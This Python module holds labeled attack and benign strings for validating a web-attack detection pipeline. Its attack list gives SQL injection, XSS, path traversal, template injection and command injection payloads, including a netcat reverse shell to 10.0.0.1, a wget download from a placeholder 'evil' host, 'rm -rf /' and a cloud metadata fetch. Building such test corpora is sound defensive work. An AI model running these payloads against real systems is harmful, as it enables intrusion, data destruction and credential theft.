"""Labeled attack + benign corpora for end-to-end gate validation.

These payloads are intentionally different from the M1 training seeds so the gate
measures generalization of the whole pipeline (CRS + M1 + M2 + M3), not recall of
the training set. Attacks span five families; benign covers realistic API/browser
values plus hard negatives that look attack-ish but are legitimate.
"""

from __future__ import annotations

ATTACKS: list[tuple[str, str]] = [
    # --- sqli ---
    ("sqli", "1' OR '1'='1"), ("sqli", "' OR 1=1-- -"), ("sqli", "admin'#"),
    ("sqli", "1 UNION SELECT username,password FROM users"),
    ("sqli", "1); DROP TABLE users--"), ("sqli", "' UNION ALL SELECT NULL,@@version--"),
    ("sqli", "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"),
    ("sqli", "1' AND SLEEP(5) AND 'a'='a"), ("sqli", "1' WAITFOR DELAY '0:0:5'--"),
    ("sqli", "1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,version())),1)"),
    ("sqli", "' OR EXISTS(SELECT * FROM users)--"), ("sqli", "1);SELECT pg_sleep(5)--"),
    ("sqli", "1' AND extractvalue(1,concat(0x7e,(SELECT database())))--"),
    ("sqli", "-1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--"), ("sqli", "1' OR 'x'='x' /*"),
    # --- xss ---
    ("xss", "<script>alert(document.cookie)</script>"), ("xss", "<img src=x onerror=alert(1)>"),
    ("xss", "<svg/onload=alert(1)>"), ("xss", "\"><script>alert(1)</script>"),
    ("xss", "javascript:alert(1)"), ("xss", "<body onload=alert(1)>"),
    ("xss", "<iframe src=javascript:alert(1)></iframe>"), ("xss", "<input autofocus onfocus=alert(1)>"),
    ("xss", "<details open ontoggle=alert(1)>"), ("xss", "<a href=\"javascript:alert(1)\">x</a>"),
    ("xss", "<img src=1 href=1 onerror=\"javascript:alert(1)\">"), ("xss", "<marquee onstart=alert(1)>"),
    ("xss", "<video><source onerror=\"alert(1)\">"), ("xss", "<select autofocus onfocus=alert(1)>"),
    ("xss", "'\"><svg onload=alert(String.fromCharCode(88,83,83))>"),
    # --- traversal ---
    ("traversal", "../../../../etc/passwd"), ("traversal", "..\\..\\..\\windows\\win.ini"),
    ("traversal", "....//....//....//etc/passwd"), ("traversal", "../../../../etc/shadow"),
    ("traversal", "/var/www/../../etc/passwd"), ("traversal", "../../../proc/self/environ"),
    ("traversal", "file:///etc/passwd"), ("traversal", "../../../../boot.ini"),
    # --- cmdi ---
    ("cmdi", "; cat /etc/passwd"), ("cmdi", "| whoami"), ("cmdi", "`id`"),
    ("cmdi", "$(cat /etc/passwd)"), ("cmdi", "; rm -rf /"), ("cmdi", "&& wget http://evil/x"),
    ("cmdi", "| nc -e /bin/sh 10.0.0.1 4444"), ("cmdi", "; ping -c 1 evil.com"),
    ("cmdi", "$(curl http://169.254.169.254/latest/meta-data/)"), ("cmdi", "; python -c 'import os;os.system(\"id\")'"),
    # --- ssti ---
    ("ssti", "{{7*7}}"), ("ssti", "${7*7}"), ("ssti", "#{7*7}"), ("ssti", "{{config.items()}}"),
    ("ssti", "{{''.__class__.__mro__[1].__subclasses__()}}"), ("ssti", "<%= 7*7 %>"),
    ("ssti", "${T(java.lang.Runtime).getRuntime().exec('id')}"), ("ssti", "{{request.application.__globals__}}"),
]

_BENIGN_WORDS = ("apple banana laptop wireless headphones cotton shirt bread weather order iphone review "
    "product price sale menu category plan account settings password reset delivery photo album beach "
    "meeting invoice engineer report summary chart dashboard green tea coffee downtown museum ticket "
    "flight hotel booking refund tracking size color blue red medium large discount coupon cart checkout "
    "shipping address city country profile upload download document folder project client vendor").split()

_HARD_NEGATIVES = [
    "a && b are both true", "if (x > 0 && y < 10) return", "3+4*2 = 11", "price: $5 | $10 | $20",
    "SELECT your preferred option", "drop-down list of countries", "union of two sets A and B",
    "O'Brien's order #123", "it's a user's choice", "path/to/my/file.txt", "src/main/app.py",
    "5 < 10 and 10 > 5", "x = (a+b)/c", "email name@host.com", "quote: \"hello there\"",
    "1=1 is always true in math", "insert coin to play", "delete this note", "update your profile",
    "where is my order", "use --flag for help", "version 4.14.0", "semicolon; separated; values",
    "back-tick `code` sample", "SsangYong Korando", "C++ vs C# comparison", "the <b>bold</b> plan",
]


def benign(n: int = 2000) -> list[str]:
    import random
    rng = random.Random(4242)
    out: list[str] = []
    for _ in range(n):
        k = rng.random()
        if k < 0.25:
            out.append(" ".join(rng.sample(_BENIGN_WORDS, rng.randint(1, 6))))
        elif k < 0.40:
            out.append(rng.choice(_HARD_NEGATIVES))
        elif k < 0.55:
            out.append(str(rng.randint(0, 10_000_000)))
        elif k < 0.68:
            out.append(f"{rng.choice(_BENIGN_WORDS)}.{rng.choice(_BENIGN_WORDS)}@example.com")
        elif k < 0.80:
            out.append("/".join(rng.sample(_BENIGN_WORDS, rng.randint(1, 4))))
        elif k < 0.90:
            out.append(f"https://shop.example.com/{rng.choice(_BENIGN_WORDS)}?ref={rng.randint(1,999)}")
        else:
            out.append('{"q":"%s","n":%d}' % (rng.choice(_BENIGN_WORDS), rng.randint(1, 99)))
    return out
